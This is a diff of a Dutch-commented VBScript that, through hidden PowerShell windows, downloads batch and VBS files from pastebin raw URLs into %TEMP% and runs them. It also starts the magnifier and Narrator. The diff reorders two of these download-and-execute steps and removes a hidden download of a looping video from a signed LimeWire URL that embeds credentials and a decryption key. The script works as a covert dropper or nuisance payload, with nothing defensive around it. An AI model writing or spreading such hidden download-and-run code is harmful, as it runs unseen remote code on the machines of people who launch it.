@@ -4,6 +4,13 @@ Set WshShell = CreateObject("WScript.Shell")
 WshShell.Run "powershell -w hidden -c ""(New-Object Net.WebClient).DownloadFile('https://pastebin.com/raw/wCbsqrNY','%TEMP%\pingyoutube.bat'); Start-Process '%TEMP%\pingyoutube.bat'""", 0, False
 WScript.Sleep 950
 
+' Download en start relaunchping.bat
+WshShell.Run "powershell -w hidden -c ""(New-Object Net.WebClient).DownloadFile('https://pastebin.com/raw/TiNThhxW','%TEMP%\relaunchping.bat'); Start-Process '%TEMP%\relaunchping.bat'""", 0, False
+WScript.Sleep 1200
+
+WshShell.Run "powershell -w hidden -c ""(New-Object Net.WebClient).DownloadFile('https://pastebin.com/raw/NfhDWkdS','%TEMP%\mousemove.vbs'); Start-Process '%TEMP%\mousemove.vbs'""", 0, False
+WScript.Sleep 500
+
 ' Start vergrootglas
 WshShell.Run "magnify.exe", 1, False
 
@@ -13,21 +20,8 @@ For i = 1 To 60
     WScript.Sleep 150
 Next
 
-' Download video met PowerShell
-WshShell.Run "powershell -w hidden -c ""(New-Object Net.WebClient).DownloadFile('https://limewire.com/decrypt?downloadUrl=https%3A%2F%2Flimewire-filesharing-production.b61cdfd8cf17f52ddc020162e738eb5d.r2.cloudflarestorage.com%2Fbuckets%2Fda76e3b5-7a89-40c5-a5d8-fac6ae4469e7%2F9e8f9cf3-217f-4890-a68e-6f212da8e893%3FX-Amz-Algorithm%3DAWS4-HMAC-SHA256%26X-Amz-Date%3D20250703T120251Z%26X-Amz-SignedHeaders%3Dhost%26X-Amz-Credential%3Da1868571dfad6d4fe293ee5b945a0ad5%252F20250703%252Fauto%252Fs3%252Faws4_request%26X-Amz-Expires%3D14400%26X-Amz-Signature%3D38addd1cb06cc5351341a1cf25c894f99aacf59c2c560056839c6ea0c5f5fde1&mediaType=video%2Fmp4&decryptionSession=eyJhZXNKd2tHY20iOnsiYWVzS2V5VHlwZSI6IlNZTU1FVFJJQ19BRVMtR0NNX0tFWSIsImp3ayI6eyJhbGciOiJBMjU2R0NNIiwiZXh0Ijp0cnVlLCJrIjoiNmEzTWlWYS11THFQUEFZQk4zLVVrd2txeWNjcm1yVmhZVm9LNFBmRXpZQSIsImtleV9vcHMiOlsiZW5jcnlwdCIsImRlY3J5cHQiXSwia3R5Ijoib2N0In19LCJhZXNKd2tDdHIiOnsiYWVzS2V5VHlwZSI6IlNZTU1FVFJJQ19BRVMtQ1RSX0tFWSIsImp3ayI6eyJhbGciOiJBMjU2Q1RSIiwiZXh0Ijp0cnVlLCJrIjoiNmEzTWlWYS11THFQUEFZQk4zLVVrd2txeWNjcm1yVmhZVm9LNFBmRXpZQSIsImtleV9vcHMiOlsiZW5jcnlwdCIsImRlY3J5cHQiXSwia3R5Ijoib2N0In19fQ','%TEMP%\video.mp4')""", 0, True
-
-' Speel video af in VLC in loop
-WshShell.Run """C:\Program Files\VideoLAN\VLC\vlc.exe"" ""%TEMP%\video.mp4"" --loop", 0, False
-
 ' Start verteller
 WshShell.Run "narrator", 0, False
-
-' Download en start relaunchping.bat
-WshShell.Run "powershell -w hidden -c ""(New-Object Net.WebClient).DownloadFile('https://pastebin.com/raw/TiNThhxW','%TEMP%\relaunchping.bat'); Start-Process '%TEMP%\relaunchping.bat'""", 0, False
-WScript.Sleep 1200
-
-WshShell.Run "powershell -w hidden -c ""(New-Object Net.WebClient).DownloadFile('https://pastebin.com/raw/NfhDWkdS','%TEMP%\mousemove.vbs'); Start-Process '%TEMP%\mousemove.vbs'""", 0, False
-WScript.Sleep 500
 
 WshShell.Run "powershell -w hidden -c ""(New-Object Net.WebClient).DownloadFile('https://pastebin.com/raw/tLYqCwJQ','%TEMP%\soundloop.vbs')""", 0, True
 WshShell.Run "wscript.exe %TEMP%\soundloop.vbs", 0, False
